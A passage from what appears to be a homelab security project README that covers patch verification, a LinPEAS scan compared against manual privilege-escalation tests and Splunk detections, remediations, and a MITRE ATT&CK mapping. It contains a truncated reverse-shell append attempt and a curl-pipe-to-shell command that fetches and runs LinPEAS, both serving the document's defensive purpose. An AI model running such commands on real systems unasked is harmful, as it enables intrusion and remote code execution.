| `echo 'bash -i >& ...' >> backup.sh` | `Permission denied` |

<img width="1258" height="63" alt="Screenshot 2026-04-24 at 3 21 43 PM" src="https://github.com/user-attachments/assets/0c460bf5-2eae-4442-837a-b655cd14cca7" />

**Note on Patch 1:** labadmin retains full sudo access via group membership (`(ALL:ALL) ALL`). The specific NOPASSWD vim misconfiguration was removed — in production the appropriate remediation would also restrict sudo to only required commands following the Principle of Least Privilege.

---

## Phase 9 — LinPEAS Automated Scanner Comparison

LinPEAS is a post-exploitation enumeration script that scans a Linux system for misconfigurations, weak permissions, and vulnerabilities that could allow an attacker to escalate privileges to root. It was run after patching to compare automated scanner coverage against manual attack simulation.

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null
```

### Detection Comparison

| Finding | Manual Attack | LinPEAS | Splunk Alert Fired |
|---|---|---|---|
| SUID find exploitable | ✅ Found and exploited | ❌ Not found (patched) | ✅ Detection 1 |
| Sudo vim NOPASSWD | ✅ Found and exploited | ❌ Not found (patched) | ✅ Detection 2 |
| Writable cron script | ✅ Found and exploited | ❌ Not found (patched) | ✅ Detection 4 |
| /etc/shadow access | ✅ Simulated | ✅ LinPEAS reads it | ✅ Detection 3 |
| CVE-2026-41651 PackageKit | ❌ Not found | ✅ Found | ❌ No detection built |
| LXD group privesc path | ❌ Not found | ✅ Found | ❌ No detection built |
| bash_history exposure | ❌ Not found | ✅ Found | ❌ No detection built |
| Postgres exposed 0.0.0.0 | ❌ Not found | ✅ Found | ❌ No detection built |

### Key Finding — LinPEAS SUID Detection Bypass

LinPEAS bypassed Detection 1 (SUID enumeration) by using internal bash functions rather than calling the `find` binary directly. LinPEAS reads filesystem metadata through shell built-ins and direct stat calls that do not generate EXECVE records matching our audit rules.

**Only Detection 3 (Credential File Access) fired during LinPEAS** — triggered when LinPEAS read /etc/shadow as part of its enumeration routine. All other detections stayed silent because LinPEAS is a reconnaissance tool that looks without exploiting.

**Takeaway:** Manual attacks trigger behavioral detections. Automated scanners find configuration vulnerabilities. Neither approach catches everything alone — mature security programs combine both behavioral monitoring and automated scanning for complete coverage.

### Additional Findings from LinPEAS

**Critical — CVE-2026-41651 (Pack2TheRoot)**
PackageKit 1.2.8 is in the vulnerable range (>=1.0.2 <=1.3.4). No patched version was available for Ubuntu Noble at time of writing. Documented as an unpatched known vulnerability. Detection and remediation deferred to Domain 7 — Vulnerability Management.

**High — LXD Group Membership**
labadmin was in the `lxd` group — a documented privilege escalation path allowing container-based host filesystem access. Remediated immediately:
```bash
sudo gpasswd -d labadmin lxd
```

**Medium — UFW Disabled**
Host-based firewall was not running. Remediated:
```bash
sudo ufw enable
sudo ufw allow 22/tcp
sudo ufw allow 8000/tcp
sudo ufw allow 9997/tcp
sudo ufw allow 5514/udp
```

**Medium — Postgres Listening on 0.0.0.0:5432**
Splunk's internal database accessible from all interfaces. Documented as known finding — acceptable risk for homelab, would be firewall-restricted in production.

---

## MITRE ATT&CK Mapping

| Technique | ID | Phase | Detected |
|---|---|---|---|
| Sudo and Sudo Caching Abuse | T1548.003 | Exploitation | ✅ Detection 2 |
| Setuid and Setgid | T1548.001 | Exploitation | ✅ Detection 1 + 4 |
| Scheduled Task/Job: Cron | T1053.003 | Exploitation | ✅ Detection 4 |
| Credentials in Files | T1552.001 | Post-Exploitation | ✅ Detection 3 |
| Clear Linux Logs | T1070.002 | Post-Exploitation | ✅ Detection 6 |
| Ingress Tool Transfer | T1105 | Post-Exploitation | ✅ Detection 5 |
| Create Account | T1136.001 | Persistence | ✅ Detection 7 |

---

## Known Limitations and Detection Gaps

| Gap | Description | Mitigation Path |
|---|---|---|
| LinPEAS SUID bypass | Automated tools using shell built-ins bypass EXECVE-based detection | Syscall-level mass stat monitoring — deferred to BLIP-AI V3 behavioral baseline |
| bash /etc/passwd injection | Shell redirect to /etc/passwd not captured as EXECVE | Monitor via inotify or additional PATH-level auditd rules |
| CVE-2026-41651 | PackageKit privesc — no patch available at time of writing | Domain 7 Vulnerability Management — CVE tracking and patching workflow |
| Postgres network exposure | Splunk database accessible from all interfaces | Production remediation: bind to 127.0.0.1 only |

---

---

## Next Project

[Domain 01 — Project 03: Linux Persistence Detection →](../03-Persistence-Detection/README.md)
